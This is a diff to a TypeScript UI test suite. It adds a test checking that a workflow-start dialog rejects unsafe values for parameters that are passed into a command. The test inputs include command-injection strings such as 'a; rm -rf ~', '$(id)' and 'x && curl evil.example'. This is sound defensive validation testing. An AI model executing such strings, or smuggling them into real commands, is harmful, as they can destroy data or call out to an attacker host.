@@ -13,7 +13,13 @@ import type { Nav } from '../ui/src/App';
 import type { InboxItem, PlanReport, RoleFile, WorkflowInfo } from '../ui/src/types';
 import { MilestonePlan } from '../ui/src/ui/plan';
 import { RoleEditor } from '../ui/src/ui/roles';
-import { missingParams, startParams, StartWorkflow } from '../ui/src/ui/workflow';
+import {
+  COMMAND_PARAM_HINT,
+  missingParams,
+  paramProblem,
+  startParams,
+  StartWorkflow,
+} from '../ui/src/ui/workflow';
 import { Inbox } from '../ui/src/views/Inbox';
 
 declare global {
@@ -256,6 +262,40 @@ describe('Start a workflow', () => {
       },
     ]);
     expect(started).toHaveBeenCalledWith('T-0007');
+  });
+
+  it('says which parameters go into a command, and holds Start on a value it would refuse', async () => {
+    const check: WorkflowInfo = {
+      root: 'r',
+      id: 'check',
+      title: 'Check',
+      approval: 'proposal',
+      params: { target: { required: true }, ver: { default: '1', pattern: '[0-9]+' } },
+      command_params: ['target'],
+      stages: 1,
+      ok: true,
+      problems: [],
+    };
+    expect(paramProblem(check, 'target', 'test/a.test.ts')).toBeNull();
+    for (const bad of ['a; rm -rf ~', '$(id)', 'two words', '%PATH%', '-rf', '"x"']) {
+      expect(paramProblem(check, 'target', bad), bad).toContain('goes into a check command');
+    }
+    expect(paramProblem(check, 'ver', 'x')).toBe('ver must match [0-9]+');
+    expect(paramProblem(check, 'ver', '')).toBeNull();
+    answers.set('/api/workflows', [check]);
+    await mount(
+      createElement(StartWorkflow, { me: 'human:dawid', onClose: () => {}, onStarted: () => {} }),
+    );
+    const dialog = document.body.querySelector('[data-start-workflow]')!;
+    expect(dialog.querySelector('[data-command-param="target"]')!.textContent).toBe(
+      COMMAND_PARAM_HINT,
+    );
+    type(dialog.querySelector('input')!, 'x && curl evil.example');
+    expect(dialog.querySelector('[data-param-problem="target"]')).not.toBeNull();
+    expect(button('Start', dialog).disabled).toBe(true);
+    type(dialog.querySelector('input')!, 'test/a.test.ts');
+    expect(dialog.querySelector('[data-param-problem="target"]')).toBeNull();
+    expect(button('Start', dialog).disabled).toBe(false);
   });
 
   it('says so when the project has no workflows', async () => {
